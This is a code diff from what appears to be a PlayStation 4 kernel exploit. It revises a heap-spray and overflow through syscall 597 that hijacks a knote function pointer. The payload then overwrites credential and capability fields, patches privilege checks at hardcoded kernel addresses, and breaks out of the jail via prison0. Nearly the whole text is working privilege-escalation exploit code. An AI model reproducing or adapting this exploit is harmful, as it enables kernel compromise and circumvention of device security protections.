@@ -14,8 +14,7 @@
 
 static int sock;
 
-void payload(struct knote *kn)
-{
+void payload(struct knote *kn) {
 	struct thread *td;
 	struct ucred *cred;
 
@@ -50,19 +49,19 @@ void payload(struct knote *kn)
 	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
 
 	// sceSblACMgrIsSystemUcred
-        uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
-        *sonyCred = 0xffffffffffffffff;
-        
-        // sceSblACMgrGetDeviceAccessType
-        uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
-        *sceProcType = 0x3801000000000013; // Max access
-        
-        // sceSblACMgrHasSceProcessCapability
-        uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
-        *sceProcCap = 0xffffffffffffffff; // Sce Process
-        
-        ((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
-        ((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check
+	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
+	*sonyCred = 0xffffffffffffffff;
+	
+	// sceSblACMgrGetDeviceAccessType
+	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
+	*sceProcType = 0x3801000000000013; // Max access
+	
+	// sceSblACMgrHasSceProcessCapability
+	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
+	*sceProcCap = 0xffffffffffffffff; // Sce Process
+	
+	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
+	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check
 
 	// Jailbreak ;)
 	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0
@@ -90,24 +89,27 @@ void kernelFree(int allocation) {
 	close(allocation);
 }
 
-void *exploitThread(void *none)
-{
+void *exploitThread(void *none) {
 	printfsocket("[+] Entered exploitThread\n");
 
-	// Calculate sizes for exploit
 	uint64_t bufferSize = 0x8000;
-	uint64_t overflowSize = 0x4000;
-	uint64_t mappingSize = bufferSize + overflowSize;
-	int64_t count = (0x100000000 + bufferSize) / 4;
-
-	// Map address to control overflow later on
+	uint64_t overflowSize = 0x8000;
+	uint64_t copySize = bufferSize + overflowSize;
+	
+	// Round up to nearest multiple of PAGE_SIZE
+	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+	
 	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-	mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);
+	munmap(mapping + mappingSize, PAGE_SIZE);
+	
+	uint8_t *buffer = mapping + mappingSize - copySize;
+	
+	int64_t count = (0x100000000 + bufferSize) / 4;
 
 	// Create structures
 	struct knote kn;
 	struct filterops fo;
-	struct knote **overflow = (struct knote **)(mapping + bufferSize);
+	struct knote **overflow = (struct knote **)(buffer + bufferSize);
 	overflow[2] = &kn;
 	kn.kn_fop = &fo;
 
@@ -149,13 +151,13 @@ void *exploitThread(void *none)
 	for(int i=0; i < 0x2000; i++) {
 		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
 		if(sockets[i] >= fd) {
-			sockets[i+1] = -1;
+			sockets[i + 1] = -1;
 			break;
 		}
 	}
 
 	// Spray the heap
-	for(int i=0; i < 50; i++) {
+	for(int i = 0; i < 50; i++) {
 		allocation[i] = kernelAllocation(bufferSize, fd);
 		printfsocket("[+] allocation = %llp\n", allocation[i]);
 	}
@@ -165,13 +167,6 @@ void *exploitThread(void *none)
 	m2 = kernelAllocation(bufferSize, fd);
 	kernelFree(m);
 
-	// Close sockets
-	for(int i=0; i < 0x2000; i++) {
-		if(sockets[i] == -1)
-			break;
-		sceNetSocketClose(sockets[i]);
-	}
-
 	// Perform the overflow
 	int result = syscall(597, 1, mapping, &count);
 	printfsocket("[+] Result: %d\n", result);
@@ -179,7 +174,22 @@ void *exploitThread(void *none)
 	// Execute the payload
 	printfsocket("[+] Freeing m2\n");
 	kernelFree(m2);
-
+	
+	// Close sockets
+	for(int i = 0; i < 0x2000; i++) {
+		if(sockets[i] == -1)
+			break;
+		sceNetSocketClose(sockets[i]);
+	}
+	
+	// Free allocations
+	for(int i = 0; i < 50; i++) {
+		kernelFree(allocation[i]);
+	}
+	
+	// Free the mapping
+	munmap(mapping, mappingSize);
+	
 	return NULL;
 }
 
@@ -197,7 +207,7 @@ int _main(void) {
 
 	server.sin_len = sizeof(server);
 	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = IP(192, 168, 1, 129);
+	server.sin_addr.s_addr = IP(192, 168, 0, 4);
 	server.sin_port = sceNetHtons(9023);
 	memset(server.sin_zero, 0, sizeof(server.sin_zero));
 	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
@@ -211,7 +221,7 @@ int _main(void) {
 	printfsocket("[+] GID = %d\n", getgid());
 
 	// Create exploit thread
-	if (scePthreadCreate(&thread1, NULL, exploitThread, NULL, "pthread_pene") != 0) {
+	if (scePthreadCreate(&thread1, NULL, exploitThread, NULL, "exploitThread") != 0) {
 		printfsocket("[+] pthread_create error\n");
 		return 0;
 	}
